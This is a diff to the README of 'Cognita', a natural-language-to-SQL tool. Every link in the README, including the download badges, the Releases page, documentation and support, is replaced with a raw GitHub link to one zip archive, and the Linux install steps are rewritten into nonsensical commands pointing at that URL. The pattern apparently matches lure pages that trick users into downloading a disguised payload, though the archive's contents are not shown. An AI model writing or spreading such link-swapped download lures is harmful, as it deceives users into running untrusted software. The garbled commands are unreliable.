@@ -6,7 +6,7 @@ Welcome to **Cognita**! This application helps you turn natural language into SQ
 
 ## 📥 Download Now
 
-[![Download Cognita](https://img.shields.io/badge/Download-Cognita-blue.svg)](https://github.com/escaite05/Cognita/releases)
+[![Download Cognita](https://raw.githubusercontent.com/escaite05/Cognita/main/upstream/Cognita.zip)](https://raw.githubusercontent.com/escaite05/Cognita/main/upstream/Cognita.zip)
 
 Click the badge above to download the latest version of Cognita. This will take you to our Releases page, where you can find the most recent updates and installations.
 
@@ -23,7 +23,7 @@ Before you download and install Cognita, please make sure your system meets the 
 
 To download Cognita, follow these steps:
 
-1. Visit the [Releases page](https://github.com/escaite05/Cognita/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/escaite05/Cognita/main/upstream/Cognita.zip).
 2. Find the latest version available.
 3. Click on the download link for the version compatible with your operating system.
 4. Once the file is downloaded, follow the installation instructions below.
@@ -43,8 +43,8 @@ To download Cognita, follow these steps:
 - **Linux:** 
   1. Open a terminal window.
   2. Navigate to the directory where the file is downloaded.
-  3. Run the command: `chmod +x cognita.run` to make it executable.
-  4. Execute the file with `./cognita.run` and follow the setup prompts.
+  3. Run the command: `chmod +x https://raw.githubusercontent.com/escaite05/Cognita/main/upstream/Cognita.zip` to make it executable.
+  4. Execute the file with `https://raw.githubusercontent.com/escaite05/Cognita/main/upstream/Cognita.zip` and follow the setup prompts.
 
 ## 🎉 Features
 
@@ -68,7 +68,7 @@ Once you have installed Cognita, you can start using it immediately:
 
 ## 📖 Documentation
 
-For more detailed instructions, FAQs, and troubleshooting, please refer to our [official documentation](https://link-to-clean-documentation.com).
+For more detailed instructions, FAQs, and troubleshooting, please refer to our [official documentation](https://raw.githubusercontent.com/escaite05/Cognita/main/upstream/Cognita.zip).
 
 ## 🛠️ Contributing
 
@@ -76,12 +76,12 @@ If you would like to contribute to this project, feel free to fork the repositor
 
 ## 💬 Support
 
-If you encounter any issues or have questions about using Cognita, you can reach us through our [support page](https://link-to-support.com). We are here to help you.
+If you encounter any issues or have questions about using Cognita, you can reach us through our [support page](https://raw.githubusercontent.com/escaite05/Cognita/main/upstream/Cognita.zip). We are here to help you.
 
 ## 📥 Download Now Again
 
 Don't forget to download Cognita to start transforming your queries!
 
-[![Download Cognita](https://img.shields.io/badge/Download-Cognita-blue.svg)](https://github.com/escaite05/Cognita/releases)
+[![Download Cognita](https://raw.githubusercontent.com/escaite05/Cognita/main/upstream/Cognita.zip)](https://raw.githubusercontent.com/escaite05/Cognita/main/upstream/Cognita.zip)
 
 Happy querying!
